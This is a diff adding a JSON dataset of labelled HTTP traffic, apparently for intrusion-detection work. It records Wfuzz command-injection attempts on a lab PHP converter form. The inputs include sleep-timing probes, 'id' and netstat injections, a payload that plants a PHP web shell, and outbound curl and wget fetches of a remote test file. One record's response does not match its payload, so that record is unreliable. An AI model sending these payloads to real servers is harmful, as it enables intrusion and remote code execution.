+    "req_body": "ytlink=%3B%20str%3D%24%28echo%20YBRDJI%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%5C%5C&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:50 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61406",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "183"
+    },
+    "req_body": "ytlink=%3B%20str%3D%24%28echo%20OKKNHF%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%7C&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:52 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61407",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "146"
+    },
+    "req_body": "ytlink=%7C%20%5B%207%20-ne%20%24%28echo%20CXWPXJ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%255C%255C&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:52 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61408",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "141"
+    },
+    "req_body": "ytlink=%7C%20%5B%201%20-ne%20%24%28echo%20FTWOKG%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%257C&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:53 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61410",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "186"
+    },
+    "req_body": "ytlink=%27%0A%20str%3D%24%28echo%20LMRVVK%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%27&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:53 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61411",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "189"
+    },
+    "req_body": "ytlink=%27%3B%20str%3D%24%28echo%20ERVJHE%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%5C%5C&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:53 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61412",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "186"
+    },
+    "req_body": "ytlink=%27%0A%20str%3D%24%28echo%20GIPRGX%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%26&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:53 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61413",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "193"
+    },
+    "req_body": "ytlink=%27%0A%20str%3D%24%28echo%20GZKCJA%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%255C%255C&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:54 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61414",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "188"
+    },
+    "req_body": "ytlink=%27%0A%20str%3D%24%28echo%20ROEZHE%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%257C&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:54 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61415",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "186"
+    },
+    "req_body": "ytlink=%22%0A%20str%3D%24%28echo%20ROWALZ%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%27&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:54 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61416",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "145"
+    },
+    "req_body": "ytlink=%22%7C%20%5B%204%20-ne%20%24%28echo%20YPWXZB%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%5C%5C&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:55 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61417",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "188"
+    },
+    "req_body": "ytlink=%22%3B%20str%3D%24%28echo%20GRQQCI%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2527&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:55 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61418",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "22"
+    },
+    "req_body": "ytlink=%0Aid&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:55 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "333",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "uid=33(www-data) gid=33(www-data) groups=33(www-data)   <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61419",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "66"
+    },
+    "req_body": "ytlink=; echo \"<?php system($_GET['cmd']); ?>\" > cmd.php&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:56 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61421",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "31"
+    },
+    "req_body": "ytlink=&& netstat -an&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:57 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61422",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "45"
+    },
+    "req_body": "ytlink=%0a ping -i 30 127.0.0.1 %0a&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:55 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61423",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "27"
+    },
+    "req_body": "ytlink=; sleep 15&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:57:12 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.34",
+    "dst_ip": "13.224.103.56",
+    "src_port": "44316",
+    "dst_port": "80",
+    "req_method": "GET",
+    "req_url": "http://crowdshield.com/.testing/rce.txt",
+    "req_headers": {
+      "http.host": "crowdshield.com",
+      "http.user_agent": "curl/7.81.0",
+      "http.accept": "*/*"
+    },
+    "req_body": null,
+    "res_headers": {
+      "http.response.code": "301",
+      "http.server": "CloudFront",
+      "http.date": "Sat, 04 Feb 2023 15:56:56 GMT",
+      "http.content_type": "text/html",
+      "http.content_length": "167",
+      "http.connection": "keep-alive"
+    },
+    "res_body": "<html> <head><title>301 Moved Permanently</title></head> <body> <center><h1>301 Moved Permanently</h1></center> <hr><center>CloudFront</center> </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61424",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "29"
+    },
+    "req_body": "ytlink=& systeminfo&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:57:07 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61425",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "33"
+    },
+    "req_body": "ytlink=`ping 127.0.0.1`&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:59 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61428",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "31"
+    },
+    "req_body": "ytlink=a)|/usr/bin/id&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:57:36 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61433",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "33"
+    },
+    "req_body": "ytlink=`ping 127.0.0.1`&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:57:36 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.34",
+    "dst_ip": "13.224.103.15",
+    "src_port": "33988",
+    "dst_port": "80",
+    "req_method": "GET",
+    "req_url": "http://crowdshield.com/.testing/rce.txt",
+    "req_headers": {
+      "http.host": "crowdshield.com",
+      "http.user_agent": "Wget/1.21.2",
+      "http.accept": "*/*",
+      "http.connection": "Keep-Alive"
+    },
+    "req_body": null,
+    "res_headers": {
+      "http.response.code": "301",
+      "http.server": "CloudFront",
+      "http.date": "Sat, 04 Feb 2023 15:57:28 GMT",
+      "http.content_type": "text/html",
+      "http.content_length": "167",
+      "http.connection": "keep-alive"
+    },
+    "res_body": "<html> <head><title>301 Moved Permanently</title></head> <body> <center><h1>301 Moved Permanently</h1></center> <hr><center>CloudFront</center> </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61436",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "45"
+    },
+    "req_body": "ytlink=%0a ping -i 30 127.0.0.1 %0a&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:57:36 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "333",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "uid=33(www-data) gid=33(www-data) groups=33(www-data)   <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  }
+]
